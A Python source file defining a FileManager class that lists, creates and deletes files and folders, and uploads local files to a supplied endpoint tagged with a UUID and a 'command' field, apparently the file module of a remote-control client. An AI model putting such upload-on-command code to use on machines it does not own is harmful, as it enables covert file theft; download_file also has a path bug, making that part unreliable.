import os
import requests
import aiohttp

class FileManager:

    
    def ls(path):
        Folder = {}
        with os.scandir(path) as files:
            for entry in files:
                Folder[entry.name] = {}
                Folder[entry.name]["isdir"] =entry.is_dir()
                Folder[entry.name]["isfile"]=entry.is_file()
                Folder[entry.name]['fullpath']= entry.path
                Folder[entry.name]["ext"] = os.path.splitext(entry.name)[1]

            if len(Folder) > 0:        
                return Folder
            else:
                return {"EMPTY":{"fullpath":"EMPTY"}}
    
    def walk(cwd:str,dest:str):
        path = os.path.join(cwd,dest)
        if os.path.isdir(path):
            return FileManager.ls(path)
        else:
            return {"Error":{"fullpath":"Cant Walk to a file"}}
                
    def back(cwd:str):
        return FileManager.ls(os.path.dirname(cwd))
    
    def mkfile(dir:str,file_name:str):
        with open(os.path.join(dir,file_name),'w',errors='ignore')as f:
                f.write("\n")
        return FileManager.ls(dir)
    
    def mkdir(base_dir,dir_name):
        os.mkdir(os.path.join(base_dir,dir_name))
        return FileManager.ls(base_dir)

    def delfile(dir:str,file_name:str):
        path = os.path.join(dir,file_name)
        os.remove(path)
        return FileManager.ls(dir)

    
    def deldir(dir:str,dir_name:str):
        path = os.path.join(dir,dir_name)
        os.removedirs(path)
        return FileManager.ls(dir)
    
    def write_to_file(cwd:str,file_name:str,data:str|list):
        path = os.path.join(cwd,file_name)
        with open(path,"a",errors='ignore') as f:
            if type(data) == str:
                f.write(data)
            elif type(data) == list:
                for item in data:
                    f.write("\n"+item)


    def files_response(uuid:str,ENDPOINT:str,command: str, file):
        params = {"UUID": uuid, "command": command}
        files = {"file": file}
        r = requests.post(ENDPOINT, files=files, params=params)
        response_json = r.json()
        return response_json, r.status_code

    def upload(cwd:str,file_name:str,uuid:str,command:str,ENDPOINT:str):
        path = os.path.join(cwd,file_name)
        with open(path, "rb") as f:
            response_json, status_code = FileManager.files_response(uuid=uuid,ENDPOINT=ENDPOINT,command=command,file=f)
            return {"responsejson":response_json,"status_code":status_code}
    
    
    def download_file(url: str,dir:str,file_name: str) -> dict:
        path = os.path.join(dir,file_name)
        r = requests.get(url).content
        with open(file_name,"wb") as f:
            f.write(r)                
        
        return FileManager.ls(dir)
    
        
